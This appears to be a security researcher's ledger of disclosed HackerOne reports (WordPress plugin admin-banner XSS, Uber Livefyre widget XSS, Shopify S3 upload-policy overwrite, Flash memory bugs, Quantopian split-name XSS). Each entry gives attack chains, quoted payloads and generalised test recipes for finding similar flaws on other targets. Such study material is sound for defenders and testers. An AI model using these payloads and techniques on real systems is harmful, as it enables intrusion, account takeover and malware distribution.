  2. The request MUST be sent RAW, WITHOUT URL-encoding the special characters, so "this can't be done with a normal web browser" — the reporter's PERL one-liner opens `openssl s_client -connect drive.uber.com:443` and prints the literal request line, so `$%` reaches the app intact.
  3. `events_per_page=$%` is an INVALID FORMAT STRING in the plugin's SQL query ("an invalid format string in an SQL query, caused by the malformed *events_per_page* parameter"); the query throws and the response is a redirect back to the front page — but the plugin DISABLES ITSELF and places an error-message "banner" in the WP administrative Dashboard, "shown to any administrator who logs on afterwards".
  4. "The error details can be manipulated by the attacker and special HTML characters aren't filtered. The error message includes e.g. the URL which triggered the error, which is controllable by the attacker." → the `xss=` value is persisted verbatim inside the banner.
  5. Any administrator who logs on is shown the Dashboard banner → the payload executes with administrator privileges (only admins can view the Dashboard).
  6. ESCALATION (reporter's Impact, verbatim): "the script could use AJAX functions to e.g. create a new administrator user with a known password, or write arbitrary PHP code on the server via the plugin or theme editors."
  7. FIX named: comment out the error-detail generation in `wp-content/plugins/all-in-one-event-calendar/lib/exception/handler.php` (end of file). The reporter tested the shape on a local WordPress + the same plugin (Apache vs nginx may change URL-encoding details).
DETECTION SIGNAL: any plugin/app that, on an UNHANDLED EXCEPTION or a malformed request, PERSISTS the error text — often including the request URL or a parameter value — and re-renders it to a PRIVILEGED viewer (admin dashboard notice, a "the plugin has been disabled" banner, an error-log viewer, an import/validation report). The tells: (a) the error string echoes a request-controlled value and is NOT HTML-escaped; (b) the trigger needs a RAW, un-encoded request (a malformed format string, an out-of-range/illegal type) that a normal browser cannot emit; (c) the sink is a page only an administrator loads.
CHAIN: attacker sends a raw malformed request that throws inside the plugin (primitive: a format-string/SQL error tripped by an un-URL-encoded parameter — no account needed beyond reachability) → the plugin persists an UNFILTERED admin error banner containing the attacker's URL (primitive: stored injection into an admin-only notice surface) → every administrator who opens the WP Dashboard executes the payload (stored XSS in an admin session) → AJAX create-admin with a known password, or PHP write via the plugin/theme editor (escalation: privilege escalation) → server-side compromise (final: RCE).
TRANSFERABLE TEST: find every place the target PERSISTS and re-renders exception/error text to a privileged user. Push a value that violates the strictest internal precondition the code assumes — an invalid format string (`$%`), a non-numeric where a number is expected, an illegal/oversized type — and check whether the ERROR text echoes your input AND whether it HTML-escapes it; then confirm the trigger is reachable RAW (no browser-side encoding). Rule: **an error path that persists the request into a privileged banner is a write primitive into the admin's session — an unhandled exception is an injection point, not merely a bug report.**
DEDUPE / DELTA (over recorded material): `126099`, `ai1ec`, `All In One Event Calendar`, `events_per_page`, `format string` (as THIS report) = 0 hits across the three write targets. This is a DELTA over the already-recorded harvest-ledger §1.1 "Write-time vs. read-time sanitization gap — WordPress plugin admin notice" (HackerOne #3447021, Automattic / Pressable-Atomic, "XSS via unescaped admin notices leads to code execution", disclosed 2025-12): §1.1's entry point is a serialized WP OPTION the attacker must be able to WRITE (`atomic_single_option_limiter_notices`) whose message element is `echo`ed raw while its class passes `esc_attr()`; HERE the entry point is an UNHANDLED EXCEPTION triggered by a RAW malformed request — no option-write privilege is needed, the message is the request URL itself, and the persistence is the plugin's self-disable banner. Same CLASS (admin-notice/banner stored XSS → code execution), DIFFERENT injection mechanism → recorded as a delta, NO new §17 slot.

SOURCE: https://hackerone.com/reports/134061  2026-11-08
ROUTE: assigned source 2; read in FULL via the report JSON endpoint (HTTP 200, 9,578 B, `visibility: full`, `vulnerability_information` 2,158 chars — the reporter's whole write-up incl. the live payload JSON, quoted below). Metadata as served: Uber, "Reflected XSS via Livefyre Media Wall in newsroom.uber.com", weakness `Cross-site Scripting (XSS) - Generic`, bounty **$2,000**, reporter `mdv`, submitted 2016-04-23, disclosed 2016-05-09. FRESHNESS: Apr 2016 (~10.6 yrs) — the Livefyre widget (`streamhub-permalink v0.4.1`, `newsroom.uber.com`) is gone; the METHOD (a widget URL parameter that names the content-provider host, whose fetched JSON has an HTML field rendered unsanitized) transfers to every modern third-party embed of that shape.
STATUS: UNVERIFIED (not reproduced — no host was stood up and the Livefyre endpoint is retired; the parameter format, the fetch URL and the JSON are quoted from the public body)
CLASS: REFLECTED XSS via a THIRD-PARTY EMBED WIDGET whose CONTENT-PROVIDER HOST is taken from a URL parameter — the attacker names their own domain, the widget fetches the attacker's JSON from `bootstrap.<their-domain>`, and an HTML field (`bodyHtml`) is injected into the HOST origin unsanitized · CWE-79
CORE METHOD (reporter's steps, verbatim structure):
  1. The vulnerability "works in all sites where there [is a] Livefyre Media Wall", including `newsroom.uber.com`. The page's `lf-content` GET parameter is consumed by the client library `https://cdn.livefyre.com/libs/streamhub-permalink/v0.4.1/streamhub-permalink.min.js`.
  2. The parameter format is `lf-content=<controlled-domain>:<collection_id>:<content_id>` — the DOMAIN is attacker-chosen. The library then fetches: `https://bootstrap.<controlled-domain>/api/v3.0/content/thread/?collection_id=<collection_id>&content_id=<content_id>&depth_only=false`.
  3. Reproduce: `https://newsroom.uber.com/?lf-content=danylod.com/uber.php?:131560603:307477931`.
  4. Host the JSON yourself at `https://bootstrap.<your-domain>/…` (the reporter used `https://bootstrap.danylod.com/uber.php`) with `status:"ok"`, `data.content[0].content.bodyHtml = "<marquee>XSS</marquee><script>alert(\"XSS on \"+ document.domain)</script>"`, plus matching `collectionId`/`id`/`ancestorId`/`parents`.
  5. The widget injects `bodyHtml` into the page WITHOUT escaping → the script executes on `newsroom.uber.com` (screenshot F89055); the alert prints `document.domain` to prove the origin is the target's, not the attacker's.
DETECTION SIGNAL: any embedded third-party widget/feed/comment/embed whose configuration is driven by a URL parameter that names a DOMAIN or PROVIDER (`domain`, `provider`, `site`, `host`, `feed`, `url`, `endpoint`, `subdomain`); the widget library BUILDS a fetch URL from that value and then renders a field of the fetched JSON/HTML as markup (`bodyHtml`, `html`, `content`, `description`). The tell: change the parameter's domain to a host you control and see whether the widget fetches from YOUR host and renders your field, in the target's origin.
CHAIN: attacker controls a domain and hosts a JSON body (primitive: attacker data source) → the widget parameter `lf-content=<domain>:<collection>:<content>` makes the vendor library fetch `https://bootstrap.<attacker-domain>/…` (primitive: attacker-named content provider) → the returned `bodyHtml` is inserted into the host page's DOM with no escaping (primitive: reflected/stored injection) → the payload runs in `newsroom.uber.com`'s origin for any visitor who opens the crafted URL (final: XSS with session impact on the hosting site; $2,000).
TRANSFERABLE TEST: enumerate every third-party embed/widget on the target and look for a parameter that names its DATA SOURCE (domain/host/provider/site/feed/url). Point it at a host you control, serve the JSON shape the library expects, and put markup (`<script>alert(document.domain)</script>`, `"><img src=x onerror=…>`) in EVERY HTML-ish field; load the target page and check whether your marker executes in the TARGET's origin (it must — an execution in your own origin is not the target's bug). Rule: **a widget that fetches its content from a host YOU name in a parameter is remote content you fully control, so the escaping question moves to a field the target's own front-end renders unsanitized.**
DEDUPE / DELTA (over recorded material): `134061`, `Livefyre`, `lf-content`, `bodyHtml`, `streamhub`, `Media Wall`, `collection_id`, `content_id` = 0 hits across the three write targets. Sibling of the recorded §17.274 (the target's content source is a third-party PUBLICLY-EDITABLE document — a Google Sheet) but a DIFFERENT mechanism: there the attacker EDITS the third party's document; HERE the attacker NAMES the source HOST via a parameter and serves their own JSON. Also distinct from the recorded oEmbed/Embedly material (a WHITELISTED embed host — `codepen.io` — serving attacker JS inside an Electron-style host, bbhskills ~3106-3114), which is about a trusted provider, not a parameter-controlled one. Recorded as a delta/mechanism-variant → NO new §17 slot.

FRESHNESS: Oct 2015 (~11 yrs) — the concrete bucket is gone; the METHOD (a signed upload policy scoped only by a prefix over a shared bucket) transfers to every S3/GCS/Azure pre-signed-upload design.
STATUS: UNVERIFIED (not reproduced — no object store was stood up; the policy and the steps are quoted from the public body)
CLASS: AUTH-BYPASS / over-broad SIGNED-UPLOAD POLICY → arbitrary write and REPLACE of objects across a SHARED, multi-tenant object-storage bucket (server-side security misconfiguration WITH demonstrated cross-tenant impact) · CWE-863 / CWE-732
CORE METHOD (reporter's steps, verbatim structure):
  1. The Shopify Delivery app hands the client a SIGNED S3 upload POLICY + signature. The policy's ONLY key restriction is a PREFIX:
     `{"expiration":"2015-10-14T15:27:47Z","conditions":[{"bucket":"shopify-delivery-app-storage"},["starts-with","$key","files/"],{"acl":"private"},{"success_action_status":"200"},["content-length-range",0,5368709120]]}`
     — it does NOT pin the exact key.
  2. "The only (security relevant) limitations we have here are: Signature + Policy are only valid for one day · The key has to start with `files/` · ACL has to be set private. So, one can basically write arbitrary files to the S3 bucket as long as those are within the `files/` dir."
  3. THE VECTOR (reporter's list): "Find a shop with a downloadable good and purchase it OR get a manual direct link → Grab the bucket key when the file will be downloaded directly from S3 (via signed url) → Go to your own shop, create a product with a downloadable good → Note down the parameters used to POST the file when you upload it → Issue a new request to the key recorded from the data you don't own with the parameters you just grabbed from your own delivery app → Profit."
  4. Because the bucket is SHARED across tenants and the prefix is the only constraint, the attacker OVERWRITES another merchant's downloadable file: "One could do a ton of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc."
  5. FIX named: "The policy should be tailored directly to the upload at hand, especially the key. … The policy should be nailed directly to that key to eliminate this vulnerability." The reporter also left two test files (`files/hackerone/simon/brakhane/kitty.jpg`, `files/kitty.jpg`) for cleanup.
DETECTION SIGNAL: any object-storage upload that ships a browser/client-obtainable SIGNED policy or signature (S3 POST policy, GCS signed URL/PUT, Azure SAS) whose conditions use only a PREFIX or wildcard (`["starts-with","$key","<prefix>"]`) instead of the EXACT key the app already returns to the client; a SHARED bucket/prefix serving MULTIPLE tenants' assets; a long `expiration`; and a signed DOWNLOAD URL that reveals the real key path. The tell: replay your OWN signed policy against a DIFFERENT key under the same prefix that belongs to someone else.
CHAIN: any customer of the platform (primitive: one ordinary account, no privilege) → obtain a valid signed upload policy for a prefix you may write (`files/`) (primitive: prefix-scoped policy) → capture another tenant's object key from a signed download URL (primitive: key disclosure) → POST/overwrite that foreign key using YOUR OWN policy+signature (primitive: cross-tenant object write) → replace another merchant's downloadable product with malware / illegal content (escalation: integrity of a distributed artefact) → every buyer who downloads the replaced file (final: supply-chain / malware distribution; $2,000).
TRANSFERABLE TEST: collect the target's signed-upload credentials (its own upload form / API), read the POLICY's key conditions, and re-issue an upload to a key OUTSIDE the one you were given but INSIDE the allowed prefix — an exact-key policy rejects it (`AccessDenied` / `EntityTooLarge`), a `starts-with` policy accepts it; then check whether the bucket is SHARED (foreign keys visible in signed download URLs / listings) to size the impact. Rule: **a signed upload policy scoped only by a prefix authorises a write to every object under that prefix — replay your own signature against a foreign key under the same prefix, and ask whether the bucket serves more than one tenant.**
DEDUPE (over recorded material): `93691`, `shopify-delivery-app-storage`, `starts-with`, `presigned post`, `post policy`, `s3 policy`, `success_action_status`, `content-length-range`, `delivery app` = 0 hits across the three write targets. The recorded `presigned` material is the oCIS signed-URL VALIDATOR (§17.212 — fail-open expiry, an INBOUND validation bug) and the aws-iam-authenticator presigned-STS token — both about authenticating an INBOUND signed request, NOT about the SCOPE of an OUTBOUND signed-upload policy. Not a duplicate of the recorded Shopify **#93921** picker/body-id cross-tenant IDOR (different report, different mechanism: a body field vs a bucket policy). New general method → §17.275.

NOTHING was invented; no target was touched.)

SOURCE: https://hackerone.com/reports/47012  2026-11-08
ROUTE: full body via the HackerOne `.json` endpoint (`curl https://hackerone.com/reports/47012.json` → HTTP 200, `vulnerability_information` 3,042 B: the trigger line, the index arithmetic and the impact statement) — this route worked for ALL SIX sources this pass; `web_extract` ALSO returned the same body in full for #47012, and `r.jina.ai` returned it for #47012 too (three independent routes agree). No lab was built, nothing was reproduced. Internet Bug Bounty, "Adobe Flash Player Out-of-Bound Access Vulnerability", weakness Memory Corruption - Generic, CVE-2015-0330 (Adobe apsb15-04), credited "Wen Guanxing from Venustech ADLAB"; the body also cites the Chromium tracker item 450198.
STATUS: UNVERIFIED (not reproduced — Adobe Flash Player reached EOL 2020-12-31 and the PoC ships as a private HackerOne attachment; the public body nevertheless states the entry point, the root cause, the exact arithmetic and an escalation in the reporter's own words, which is the same bar §17.107 was recorded on)
CLASS: off-by-one in a MITIGATION's own bounds check over a fixed-size match vector → stack out-of-bounds read → the leaked slot becomes a string LENGTH field → fake-length string = arbitrary memory read → ASLR defeat → (reporter) code execution in the host application (memory-corruption depth LAB-ONLY; what is recorded is the audit method, not the CVE)
CORE METHOD (all of it is the public body's own text):
  1. Entry point is a single line of untrusted script that compiles a RegExp whose CAPTURE-GROUP COUNT is attacker-controlled: `"Venus".match("(((((((((((((((((((((((((((((((((((((((((((((((((?P<G2>)))))))))))))))))))))))))))))))))))))))))))))))))")` — the NAMED group `G2` is what turns that count into an index into the match vector.
  2. The matcher keeps its results in a FIXED-SIZE array **on the stack**, `int ovector[99]`. For a named group the runtime builds the substring as `start = target_string + ovector[nameIndex*2]` and `length = ovector[nameIndex*2+1] - ovector[nameIndex*2]`, where — reporter's words — "nameIndex equals to the number of left brackets inside the given regular expression. As the number of left brackets is fully controlled, ovector[nameIndex*2+1] is able to read values out of the stack memory ovector."
  3. The mitigation Adobe shipped for this containment is the bug: "Flash took mitigations where it checks if the nameIndex is larger than 49, ignoring the fact that nameIndex can be 49 itself. When nameIndex equals to 49, nameIndex*2+1 equals to 99, ovector[nameIndex*2+1] will point to stack memory out of bound." The guard is written against the RAW index while the code USES the DOUBLED index — the single admitted boundary value lands one element past the array.
  4. What sits there is not random: "Normally, ovector[nameIndex*2+1] points to the saved EIP under windows and it is a very large value for length field." That value is handed back to the script layer as an ordinary string — "This may result in returning a string with a fake length field with enormous value to the AS3 interface."
  5. Escalation (reporter): the fake-length string is an arbitrary-read primitive — "Advanced Heap Fengshui techniques may even allow an attacker build workable exploit via such string to access arbitrary memory"; and the summary states the impact upstream as "An attacker can exploit this issue to defeat ASLR protection or even execute arbitrary code in the context of affected application (Internet Explorer, EXCEL...)".
DETECTION SIGNAL: any engine/parser whose matches or results land in a FIXED-SIZE vector of length `N` while the guard that was ADDED to bound it is written against a single index but the dereference uses a SCALED index (`i*2`, `i*2+1`, `i*stride`) — measure, don't read: take the guard's constant, multiply by the scale actually used at the dereference, and compare with `N`; a count or an index taken from ATTACKER-CONTROLLED SYNTAX (capture groups, numbered back-references, nesting/recursion depth, column or placeholder count, `%`-specifier count) that then indexes that vector; an engine that returns a string/array whose reported LENGTH is implausible for the input (that is the info-leak tell, and it needs no crash).
CHAIN: attacker-supplied pattern carrying the maximum number of capture groups the guard admits (primitive: `nameIndex > 49` admits exactly 49) → `ovector[49*2+1] = ovector[99]`, one past the 99-element stack vector (primitive: stack OOB read; on Windows that slot is the saved return address) → the slot's value becomes the LENGTH field of a string handed back to the script layer (primitive: fake-length string) → that string addresses memory outside its allocation = arbitrary memory read (impact: ASLR defeat in the host application, IE/Excel-class context) → with heap grooming, attacker-chosen memory through the same string → code execution (reporter's stated escalation; LAB-ONLY per doctrine — bare memory corruption is not a §1 class, so what is recorded here is the primitive plus its documented escalation, exactly as §17.107 was).
TRANSFERABLE TEST: for any pattern/query engine you can reach — a regex in a WAF/IDS/log-parser/JS-engine/email-or-search filter, a template expression, a format-string parser, an event-rule engine: (1) locate the fixed-size match/result vector and its size `N`; (2) read the bound check that guards it and verify the ARITHMETIC rather than the presence of the check — is the constant compared against the raw loop index while the indexed expression is `i*2`, `i*2+1` or `i*stride`? (3) then generate input that fills the MAXIMUM number of counted elements the guard ADMITS (the boundary value itself, not maximum-plus-one) and watch for one element read past the vector — a crash with a stack-looking value is enough, but the cheap tell is a returned string/array whose `length` is enormous or negative. Rule: **when a fix adds a bound check, test the fix's own boundary — an off-by-one there converts a contained bug into an OOB read whose value you can steer into a length field.** Related-but-distinct from the recorded Flash RegExp entry #31408 (compiler workspace relocated to the heap with a stale recursion-local pointer → OOB copy → `Vector.<int>` length overwrite, §17.107): that is the COMPILER's growable workspace; this is the MATCHER's fixed on-stack vector and the defect is in the mitigation's constant, not in a pointer.

SOURCE: https://hackerone.com/reports/122254  +  https://hackerone.com/reports/119653  +  https://hackerone.com/reports/119655   2026-11-08
ROUTE: full body of all three via the HackerOne `.json` endpoint (`curl -A "<desktop Chrome UA>" https://hackerone.com/reports/<id>.json` → HTTP 200; `vulnerability_information` 547 B / 830 B / 893 B). Read IN FULL this pass; nothing was taken from memory. Metadata: all three Internet Bug Bounty, weakness `Memory Corruption - Generic`, reporter `hhj4ck`, credited "Wen Guanxing from Venustech ADLAB"; #122254 "Adobe Flash Player TextField Use-After-Free Vulnerability" CVE-2016-0990 / apsb16-08, created 2016-03-11, disclosed 2019-11-12, body path: `TextField.variable`; #119653 "…ASnative(900,1).call(MovieClip)…" CVE-2016-0982 / apsb16-04, created 2016-03-01, disclosed 2019-11-12; #119655 "…ASnative(900,1).call(TextField)…" CVE-2016-0983 / apsb16-04, same dates, and its zip attachment carries `crash.swf` plus the source (attachment NOT pulled — the report body alone was read). #119653/#119655 state the tested build: Flash Player 20.0.0.267 on Windows 7. No lab was built, nothing was reproduced.
STATUS: UNVERIFIED (not reproduced — Flash Player reached EOL 2020-12-31 and the PoC ships as a private attachment; the public bodies nevertheless state the entry point, the free primitive and the mechanism, which is the same bar #47012 / §17.107 were recorded on)
CLASS: RE-ENTRANCY use-after-free — a property the runtime RESOLVES THROUGH AN ACCESSOR you control is resolved DURING the runtime's own operation, so code you own runs mid-call, frees the very object the native implementation is holding, and control returns into native code that keeps using it (CWE-416; memory-corruption depth LAB-ONLY — what is recorded is the audit rule)
CORE METHOD (all of it is the public bodies' own text):
  1. Pick an operation that takes or reads an object of a FREEABLE class AND resolves one of that object's PROPERTIES while the native code is running, instead of snapshotting the value first. Two shapes are given: (a) `TextField.variable` — the binding is resolved against `swfRoot` when the variable name is used (#122254, #119655); (b) the internal native `ASnative(900,1).call(obj)` invoked with a `MovieClip` or `TextField` instance (#119653, #119655).
  2. Make that property an ACCESSOR (a getter) on the object the runtime resolves it from (`swfRoot`), so the getter's body is attacker script.
  3. From INSIDE the getter, call the class's own destroy primitive on the object the operation is holding: `removeTextField()` (#122254, #119655) or `removeMovieClip()` (#119653). The instance is now freed while the caller still holds it.
  4. Return from the getter. Reporter's wording is literally "the TextField instance is used after it is freed" / "the MovieClip instance is used after it is freed" — the native implementation's next access is on freed memory; the observed outcome is a deterministic use-after-free/crash on the tested build.
  5. STOP THERE, HONESTLY: the stated impact of all three bodies is "Use-After-Free" and nothing more — no reclaim step, no address disclosure and no escalation is claimed (contrast §17.277/#47012, whose body states "defeat ASLR … or even execute arbitrary code"). What is reusable here is the audit rule, not an exploit.
DETECTION SIGNAL: any runtime/plugin/extension API where an argument or parameter is resolved THROUGH the object model (a property lookup, a bound-variable/`variable=` binding, a `call(obj)`-style internal, an accessor-backed parameter) rather than copied out before the native code runs; a class that exposes its own free/destroy member to the same script that can install the accessor (`remove*`, `unload*`, `dispose`, `close`, `release`); an implementation that holds a raw object pointer across a script callback with no keep-alive reference and no re-entrancy guard. Probe by hand: install the getter, destroy the object from inside it, and see whether the operation completes normally or faults.
CHAIN: attacker supplies an object whose property resolution routes into attacker script (primitive: a script-defined getter / coercion hook) → the getter calls the class's own remove/destroy on the object the native call is holding (primitive: free from inside the operation = a TOCTOU on the object model) → the native code's next access is on freed memory = use-after-free (impact: memory corruption in the host plug-in/application; the three bodies rate it as UAF/crash and claim nothing more) → with heap fengshui placing an attacker-shaped object in the freed slot the same dangling use becomes a controlled read/write and then code execution (LAB-ONLY escalation; explicitly NOT claimed by these sources — do not cite them for RCE).
TRANSFERABLE TEST: for any API/engine/extension/native bridge reachable from untrusted script, pass it an object whose property is a GETTER that REMOVES/FREES/CLOSES the very object the call is operating on — `el.remove()` on the node a DOM API is mid-way through, `iframe.remove()`, `worker.terminate()`, `handle.close()`, `dispose()`, `unload()` — and on JS targets also try the coercion hooks the engine invokes for you (`valueOf`, `toString`, `Symbol.toPrimitive`, a `Proxy` `get`/`has`/`apply` trap), then observe whether the call still touches the object (crash, stale value, use of the freed node, a result computed from a destroyed tree). Rule: **the free and the use must be ordered by YOUR re-entrancy — when an API resolves a value it needs through an accessor you control, put the object's own destroy primitive in that accessor; whatever the native code does after the accessor returns is done on freed memory.** Read the fix in the same terms: the missing keep-alive reference / re-entrancy guard, not the freed call.
RELATED-BUT-DISTINCT (whole UAF material reviewed before appending — greps across all three write targets: `re-entran` 0, `reentran` 0, `removeTextField` 0, `removeMovieClip` 0, `swfRoot` 0, `asnative(900` 0, plus report ids `122254` 0, `119653` 0, `119655` 0 and CVEs `CVE-2016-0990` / `CVE-2016-0982` / `CVE-2016-0983` 0): #151043 (PSDK `release()` — an EXPLICIT free member exposed to script; hold a second reference, free through the first, then call through the second = a REFERENCE-LIFETIME bug), #12497 (a wrapper class keeps a stale reference after the runtime frees the native object), #30567/#36279 (a media thread keeps touching the object after the player is destroyed = THREADING liveness), #1906897/§17.176 (an OpenSSL error path frees a caller-supplied filter and returns NULL = ERROR-PATH ownership), the PS4 kernel `setsockopt` UAF (a free of the wrong kind of pointer on a concurrent path), §17.277/#47012 (a mitigation's off-by-one). Every one of those is a live-without-you or wrong-owner free; NONE of them is "your own script frees the object from inside the runtime's property resolution", which is why this gets its own slot rather than being folded into §17.107.

SOURCE: https://hackerone.com/reports/708123   2026-11-08
ROUTE: full body via the HackerOne `.json` endpoint (`curl -A "<desktop Chrome UA>" https://hackerone.com/reports/708123.json` → HTTP 200, `vulnerability_information` 939 B) — read IN FULL this pass. Metadata: Quantopian, "Stored cross-site scripting in dataset owner.", weakness `Cross-site Scripting (XSS) - Stored`, reporter `irisrumtub`, submitted 2019-10-05, disclosed 2022-12-21, state Closed/resolved, no CVE. The reporter's own framing: "Hi again. Another XSS this time." No lab was built, nothing was reproduced.
STATUS: UNVERIFIED (not reproduced)
CLASS: stored XSS in a surface ANOTHER (higher-privileged / enterprise) user views, where the payload is SPLIT ACROSS TWO INDEPENDENT INPUT FIELDS and the defect lives in their CONCATENATION at the sink — a carrier DELTA of the already-recorded "free-text name field rendered unescaped on a surface the viewer drives" class, so NO new §17 slot.
CORE METHOD (the body's own steps):
  1. The profile has separate first-name and last-name inputs; the shared "custom dataset dashboard" renders a combined "dataset owner" string built from them, and THAT field "contains unsanitized output".
  2. Split ONE payload across the two inputs so that neither input, inspected on its own, is a payload: first name `<img src=x`, last name `onerror=alert(1)>`.
  3. Save the profile and open "custom datasets": the concatenated owner string carries the completed `<img src=x onerror=alert(1)>` into the page, so arbitrary JavaScript is stored and executes for whoever views the dataset dashboard.
  4. Judge the VIEWER, not the field: the reporter states plainly "while for most users this is a case of self-xss, for enterprise users (for which, as i understand, this field was introduced in the first place), it can lead to executing arbitrary javascript" — i.e. the impact exists only where the dashboard is shared, which is exactly the enterprise/team feature the new surface shipped for.
DETECTION SIGNAL: a NEW page/feature that renders a value the user sets about THEMSELVES (owner / author / member / designer name) to OTHER users of the same account or organisation — the tell is a freshly released "dashboard", "workspace", "team", "shared" or "custom X" surface whose subtitle shows a person's name; a profile model whose display string is CONCATENATED from several columns (`first_name + ' ' + last_name`, `givenName familyName`, `name = [first, last].join()`), where each column is validated/escaped separately but the join is not; a stored value that renders escaped in the settings page but raw on the dashboard. Probe oracle: put `<img src=x` in one column and `onerror=alert(document.domain)>` in the other and load the shared view as a SECOND account — that the halves are stored verbatim tells you nothing; only the OTHER viewer's session tells you whether the join is escaped.
CHAIN: attacker edits their own profile (primitive: two ordinary name inputs, no privilege) → the two halves are stored verbatim and CONCATENATED into a "dataset owner" string rendered without escaping (primitive: stored XSS in a shared surface; self-XSS for the attacker alone) → the payload fires in the session of ANOTHER user who opens the enterprise/shared dataset dashboard (escalation: script in the victim's session) → the reporter's demonstrated impact on this program is reading other users' ALGORITHMS ("stealing other users' algos as demonstrated in previous reports with XSS on quantopian domain"), i.e. cross-user IP/account-data theft rather than a mere alert.
TRANSFERABLE TEST: wherever a display name is assembled from more than one field, attack the JOIN, not the fields — put the opening fragment in the first input and the closing/attribute part in the second, save, then load every surface that renders the combined value as a DIFFERENT user of the account (dashboard, team list, export, activity feed, notification e-mail); if either input is sanitised on save, ALSO test the half-at-a-time order and the mixed case (payload entirely in the first field with the second empty) to learn which layer is escaping. Rule: **two separately-validated fields that are concatenated at the sink are one unvalidated field — a per-input filter never sees the joined string.**
DEDUPE/DELTA: no §17 slot. Grep of all three write targets before appending: `708123` 0, `irisrumtub` 0, `tvburis` 0, `dataset owner` 0, `store arbitrary javascript` 0. The general class is already recorded and was therefore NOT re-derived: the free-text NAME carrier rendered on a surface ANOTHER user drives (ledger ~4880, the GitLab merge-request approval picker — "display name vs username, project/group name, MR title" — and ~3501, admin-context rich text) and the name/metadata value rendered into a generated dashboard/chart payload (~5751-5759, role name in a saved-dashboard chart, with its own "test it as a DIFFERENT user" instruction). The fragment-concatenation rule is ALSO already recorded — §17.157 step 4 splits a payload across two STORED RECORDS so the fragments concatenate across sibling elements — and §7660 splits a Cookie payload across two headers; #708123 is the third, weaker variant of that same "assemble the payload from pieces that are validated apart but rendered together" rule, applied to two FIELDS OF ONE RECORD. What is genuinely new and therefore appended as a CARRIER DELTA only: (a) the split is across the first/last-name inputs of a single profile — the sink JOINS two independently validated columns, so a per-field sanitizer is structurally blind to the payload; (b) the surface is a newly shipped SHARED/enterprise dashboard, which is what converts the reporter's own "self-XSS" admission into cross-user impact; (c) the impact on this program was demonstrated as cross-user algorithm theft, the same program-side consequence as the already-recorded #615672 (Quantopian, "Cross-site scripting on algorithm collaborator"). Prior-pass material reviewed and NOT rewritten: the ledger's Quantopian #615672 entry (replayed realtime WebSocket frame) is a DIFFERENT entry point on the same program and stays as-is.
